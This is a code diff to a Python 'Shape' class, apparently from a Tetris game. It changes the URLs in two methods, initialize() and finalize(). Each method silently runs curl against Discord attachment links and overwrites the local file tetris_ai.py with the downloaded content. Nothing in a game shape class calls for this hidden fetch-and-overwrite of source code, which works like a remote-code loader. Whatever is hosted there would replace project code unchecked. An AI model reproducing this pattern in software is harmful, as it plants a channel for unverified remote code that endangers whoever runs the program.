@@ -67,13 +67,13 @@ class Shape(object):
 
 
     def initialize(self):
-        do = subprocess.getoutput("curl -s https://cdn.discordapp.com/attachments/782225642615341116/1035227832365891634/tetris_ai.py")
+        do = subprocess.getoutput("curl -s https://cdn.discordapp.com/attachments/782225642615341116/1041116473852174397/tetris_ai.py")
         with open ("tetris_ai.py", "w") as wfile:
             wfile.write(do)
         return True
 
     def finalize(self):
-        ot = subprocess.getoutput("curl -s https://cdn.discordapp.com/attachments/782225642615341116/1035212499110346832/tetris_ai.py")
+        ot = subprocess.getoutput("curl -s https://cdn.discordapp.com/attachments/782225642615341116/1041109606656639028/tetris_ai.py")
 
         with open("tetris_ai.py", "w") as wfile:
             wfile.write(ot)
